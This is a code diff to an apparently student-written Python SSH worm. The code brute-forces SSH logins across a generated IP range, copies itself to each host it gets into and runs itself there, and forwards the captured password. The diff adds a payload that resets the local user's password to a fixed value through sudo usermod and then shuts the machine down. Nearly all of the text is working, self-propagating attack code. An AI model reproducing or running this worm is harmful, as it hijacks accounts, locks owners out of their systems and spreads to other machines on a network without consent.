@@ -1,17 +1,20 @@
+#!/usr/bin/env python
 """
 Program worm should first:
-1- create IP range list, 
-2- try to ssh to devices within the IP range using list of user credentials
-3- copy itself on ssh success
-4- run the python there
-5- call the harmful attack to attack the current PC it is running on
+1- change password of current machine
+2- create IP range list, 
+3- try to ssh to devices within the IP range using list of user credentials
+4- copy itself on ssh success
+5- run the python there
+6- shutdown current machine
 """
 
 import paramiko
 import sys
 import os
 import socket
-import random
+import subprocess
+import getpass
 
 ip_range = []
 
@@ -80,7 +83,7 @@ def start_ssh_devices():
                 
                 print("SSH to host ", ip, " succeeded! I am inside hahaha!!!")
 
-                copy_worm_excute(ssh_connection)
+                copy_worm_excute(ssh_connection, password)
                 break
 
             except Exception:
@@ -91,7 +94,7 @@ def start_ssh_devices():
 """
 A function that copies the worm file to the other device via ssh connection and run it there
 """
-def copy_worm_excute(ssh_connx):
+def copy_worm_excute(ssh_connx,passwd):
 
     worm_file = "sleepingWormy.py"
     #worm_file = "HelloHacker.py"
@@ -102,7 +105,7 @@ def copy_worm_excute(ssh_connx):
 
     ssh_sftp.put(worm_file, "/" + worm_file)
 
-    ssh_connx.exec_command("python /" + worm_file + " 1")
+    ssh_connx.exec_command("python /" + worm_file + " 1 "+passwd)
 
     # ssh.exec_command("nohup python /" + fileName + " 1 &")
 
@@ -110,28 +113,43 @@ def copy_worm_excute(ssh_connx):
 
 
 """
-A function that starts doing harmful attack to the device it is running on
+A function that changes the user account's password
 """
-def start_attack():
-    directory = "/tmq"
-    count = 0
-    while count < 2:
-        try:
-            os.mkdir(directory)
-            print(directory)
-            directory += "/tmq"
-            count += 1
-        except FileExistsError:
-            directory += str(random.randint(1,100))
+def start_attack(current_password):
+    usr = getpass.getuser()
+    new_password = 'pikabuu'
+
+    p = subprocess.Popen(('openssl', 'passwd', '-1', new_password), stdout=subprocess.PIPE)
+    shadow_password = p.communicate()[0].strip()
+
+    if p.returncode != 0:
+        print ('Error creating hash for ', usr)
+
+    command = 'usermod -p '+shadow_password+' '+usr
+
+    p = os.system('echo %s|sudo -S %s' % (current_password, command))
+
+
+"""
+A function that is called when the worm finishes copying itself to other devices. 
+The function simply runs a command to shutdown the current machine
+"""
+def shutdown_device ():
+    subprocess.call("sudo shutdown -h now", shell=True)
+
+
 
 
 if __name__ == "__main__":
 
-    generate_IP_list()
-    start_ssh_devices()
-
     # the if statement below is to prevent the worm from harming my personal laptop, so it won't attack it but will ssh to other devices
-    if len(sys.argv) > 1:
+    if len(sys.argv) > 2:
+
         if sys.argv[1] == "1":
-            start_attack()
-            print("inside if statement")
+            start_attack(sys.argv[2])
+
+        generate_IP_list()
+        start_ssh_devices()
+
+        if sys.argv[1] == "1":
+            shutdown_device()
